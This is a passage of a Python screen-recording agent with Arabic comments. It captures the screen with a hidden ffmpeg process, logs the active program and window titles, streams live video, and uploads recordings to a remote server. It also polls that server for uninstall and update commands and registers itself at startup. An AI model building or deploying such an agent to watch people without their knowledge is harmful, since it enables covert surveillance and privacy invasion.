            r = _http_post(COMMANDS_PULL_URL, json=payload, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get("ok") and data.get("commands"):
                    for cmd in data["commands"]:
                        cid = int(cmd.get("id"))
                        name = (cmd.get("command") or "").lower()

                        if name == "uninstall":
                            ok, msg = schedule_self_uninstall()
                            if ok:
                                _UNINSTALLING.set()
                                ack_command(cid, "done", msg)
                                send_heartbeat_with({"client_present": 0, "pending": 0, "uninstalling": True})
                                log("Uninstall scheduled. Exiting...")
                                _shutdown_requested.set()
                                return
                            else:
                                ack_command(cid, "error", msg)

                        elif name == "live_on":
                            LIVE_ENABLED = True
                            ack_command(cid, "done", "live enabled")
                            send_heartbeat_with({"live": {"enabled": True}})

                        elif name == "live_off":
                            LIVE_ENABLED = False
                            try: _stop_live_pusher()
                            except Exception: pass
                            ack_command(cid, "done", "live disabled")
                            send_heartbeat_with({"live": {"enabled": False}})

                        elif name == "live_restart":
                            try: _stop_live_pusher()
                            except Exception: pass
                            ack_command(cid, "done", "live restart requested")
                            send_heartbeat_with({"live": {"restart": True}})

                        elif name == "update":
                            upd = cmd.get("payload")
                            if isinstance(upd, str):
                                try: upd = json.loads(upd)
                                except Exception: upd = {}
                            if not isinstance(upd, dict):
                                upd = {}
                            target_ver = str(upd.get("version") or "")
                            if target_ver and _version_ge(str(VERSION), target_ver):
                                ack_command(cid, "done", f"already on {VERSION}")
                                continue
                            _apply_update(cid, upd)
                            return
        except Exception as e:
            log(f"commands_loop error: {e}")

        _cmd_stop.wait(COMMANDS_POLL_INTERVAL)

# ==================== اكتشاف النشاط ====================
def get_activity_state(last_pos, last_active):
    try:
        pos = pyautogui.position()
    except Exception:
        return last_pos, last_active
    if pos != last_pos:
        return pos, time.time()
    elif time.time() - last_active > inactive_threshold:
        return pos, last_active
    return pos, last_active

# ==================== التسجيل + اللايف ====================
def record_segment():
    global IS_RECORDING, CURRENT_FILE_REL, LAST_PROG_INFO_FOR_HB
    if _UNINSTALLING.is_set() or _shutdown_requested.is_set():
        return

    try:
        retried = retry_pending_uploads()
        if retried:
            log(f"Retried and uploaded {retried} pending files before new segment.")
    except Exception as e:
        log(f"Error during retry_pending_uploads: {e}")

    year = time.strftime("%Y")
    month = time.strftime("%m")
    day = time.strftime("%d")
    save_folder = os.path.join(base_folder, year, month, day)
    os.makedirs(save_folder, exist_ok=True)

    start_time = time.strftime("%Y-%m-%d_%H-%M-%S")
    blob_file = os.path.join(save_folder, f"{start_time}.blob")
    key_file  = os.path.join(save_folder, f"{start_time}.key")

    rel_folder = os.path.relpath(save_folder, base_folder)
    CURRENT_FILE_REL = os.path.join(rel_folder, f"{start_time}.blob").replace("\\", "/")

    key_data = {"fps": fps, "start": start_time, "frames": [], "uploaded": False, "partial": True}

    proc = None
    video_started = False
    IS_RECORDING = False
    LAST_PROG_INFO_FOR_HB = None

    try:
        last_pos = pyautogui.position()
    except Exception:
        last_pos = (0, 0)
    last_active = time.time()
    frame_count = 0

    last_key_sample_ts = 0.0
    last_emitted_state = None
    last_prog_fingerprint = None
    last_key_flush_ts = time.time()

    def prog_fingerprint(pi):
        if not pi: return None
        return (pi.get("exe"), pi.get("title"), pi.get("pid"))

    try:
        with mss.mss() as sct:
            idx = CAPTURE_MONITOR_INDEX
            if idx < 1 or idx >= len(sct.monitors):
                idx = 1
            monitor = sct.monitors[idx]

            width, height = monitor["width"], monitor["height"]

            # تسجيل
            scale = float(target_height) / float(height)
            new_width  = max(1, int(width * scale)); new_width = new_width - (new_width % 2)
            new_height = target_height - (target_height % 2)

            # لايف
            live_scale = float(LIVE_HEIGHT) / float(height)
            live_w = max(1, int(width * live_scale)); live_w = live_w - (live_w % 2)
            live_h = LIVE_HEIGHT - (LIVE_HEIGHT % 2)

            if LIVE_ENABLED and _live_proc is None:
                _start_live_pusher(live_w, live_h)

            duration = segment_minutes * 60
            end_time = time.time() + duration

            while time.time() < end_time:
                if _shutdown_requested.is_set() or _UNINSTALLING.is_set():
                    break

                _ensure_live_running(live_w, live_h)

                last_pos, last_active = get_activity_state(last_pos, last_active)
                active = (time.time() - last_active <= inactive_threshold)

                prog_info = get_active_program()
                if prog_info:
                    LAST_PROG_INFO_FOR_HB = prog_info

                capture_for_recording = active
                capture_for_live = LIVE_ENABLED and (active or LIVE_PUSH_WHEN_INACTIVE)
                need_capture = capture_for_recording or capture_for_live

                pil_src = None
                if need_capture:
                    img = sct.grab(monitor)
                    rgb = np.array(img)[:, :, :3]
                    pil_src = Image.fromarray(rgb)

                # التسجيل عند النشاط
                if active:
                    if not video_started:
                        ffmpeg_cmd = [
                            FFMPEG_PATH, "-y",
                            "-f", "rawvideo", "-pix_fmt", "rgb24",
                            "-s", f"{new_width}x{new_height}", "-r", str(fps), "-i", "-",
                            "-c:v", "libx264", "-preset", preset, "-crf", str(crf),
                            "-pix_fmt", "yuv420p",
                            "-movflags", FFMPEG_MOVFLAGS,
                            "-f", "mp4", blob_file
                        ]
                        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
                        proc = subprocess.Popen(
                            ffmpeg_cmd,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=creationflags
                        )
                        video_started = True
                        IS_RECORDING = True
                        log(f"Started ffmpeg for {blob_file}")
                        try: send_heartbeat()
                        except Exception: pass

                    if pil_src is not None and proc is not None:
                        rec_frame = pil_src.resize((new_width, new_height))
                        try:
                            proc.stdin.write(rec_frame.convert("RGB").tobytes())
                        except Exception as e:
                            log(f"Error writing to ffmpeg stdin: {e}")
                            break

                        if proc and (proc.poll() is not None):
                            log("FFmpeg exited unexpectedly; breaking current segment loop.")
                            break

                # دفع فريم للايف
                if pil_src is not None and LIVE_ENABLED and _live_proc is not None:
                    try:
                        live_frame = pil_src.resize((live_w, live_h))
                        _push_live_frame(live_frame.convert("RGB"))
                    except Exception as e:
                        log(f"Live frame prep failed: {e}")

                # كتابة key file + heartbeat دورى
                now = time.time()
                emit_due = (now - last_key_sample_ts) >= (1.0 / KEY_SAMPLE_HZ)
                state_str = "Recording" if active else "Inactive"
                pf = prog_fingerprint(prog_info)
                state_changed = (state_str != last_emitted_state)
                prog_changed  = (pf != last_prog_fingerprint)

                if emit_due or state_changed or prog_changed:
                    frame_entry = {
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "state": state_str,
                        "program_exe": prog_info.get("exe") if prog_info else None,
                        "window_title": prog_info.get("title") if prog_info else None,
                        "pid": prog_info.get("pid") if prog_info else None
                    }
                    key_data["frames"].append(frame_entry)
                    last_key_sample_ts = now
                    last_emitted_state = state_str
                    last_prog_fingerprint = pf

                frame_count += 1

                if time.time() - last_key_flush_ts >= KEY_FLUSH_SECS:
                    try:
                        with open(key_file, "w", encoding="utf-8") as kf:
                            key_data["partial"] = True
                            if os.path.exists(blob_file):
                                key_data["blob_size_bytes"] = os.path.getsize(blob_file)
                            json.dump(key_data, kf, indent=2)
                        try: send_heartbeat()
                        except Exception: pass
                    except Exception:
                        pass
                    last_key_flush_ts = time.time()

                time.sleep(1.0 / fps)

    except Exception as e:
        log(f"Exception in screen capture: {e}")
    finally:
        if proc:
            try: proc.stdin.close()
            except Exception: pass
            try: proc.wait(timeout=30)
            except Exception:
                try: proc.kill()
                except Exception: pass

        if os.path.exists(blob_file):
            try: key_data["blob_size_bytes"] = os.path.getsize(blob_file)
            except Exception: key_data["blob_size_bytes"] = 0

        key_data["partial"] = False
        try:
            with open(key_file, "w", encoding="utf-8") as kf:
                json.dump(key_data, kf, indent=2)
        except Exception as e:
            log(f"Failed to write key file {key_file}: {e}")

        if os.path.exists(blob_file):
            try:
                uploaded = upload_and_mark(blob_file, key_file, year, month, day)
                if uploaded: log(f"Segment uploaded: {blob_file}")
                else:        log(f"Segment saved locally (upload pending): {blob_file}")
            except Exception as e:
                log(f"Exception during upload_and_mark for {blob_file}: {e}")

        IS_RECORDING = False
        CURRENT_FILE_REL = None
        try: send_heartbeat()
        except Exception: pass

# ==================== الحلقة الرئيسية ====================
def main_loop():
    log(f"Screen recorder started. v{VERSION}")
    _log_identity_once()
    _post_update_check_and_ack()

    hb_thread = Thread(target=heartbeat_loop, daemon=True); hb_thread.start()
    cmd_thread = Thread(target=commands_loop, daemon=True); cmd_thread.start()

    try:
        retried = retry_pending_uploads()
        if retried:
            log(f"Retried and uploaded {retried} pending files on startup.")
    except Exception as e:
        log(f"Error retrying pending uploads on startup: {e}")

    try:
        while True:
            if _shutdown_requested.is_set() or _UNINSTALLING.is_set():
                break
            record_segment()
            if _shutdown_requested.is_set() or _UNINSTALLING.is_set():
                break
            try:
                deleted = cleanup_old_uploaded_files()
                if deleted:
                    log(f"Cleanup removed {deleted} old uploaded key/blob pairs.")
            except Exception as e:
                log(f"Error during cleanup: {e}")
    except KeyboardInterrupt:
        log("Stopped by KeyboardInterrupt.")
    except Exception as e:
        log(f"Main loop exception: {e}")
    finally:
        _hb_stop.set(); _cmd_stop.set()
        try: hb_thread.join(timeout=3)
        except Exception: pass
        try: cmd_thread.join(timeout=3)
        except Exception: pass
        try: _stop_live_pusher()
        except Exception: pass

if __name__ == "__main__":
    try: add_to_startup()
    except Exception: pass
    main_loop()
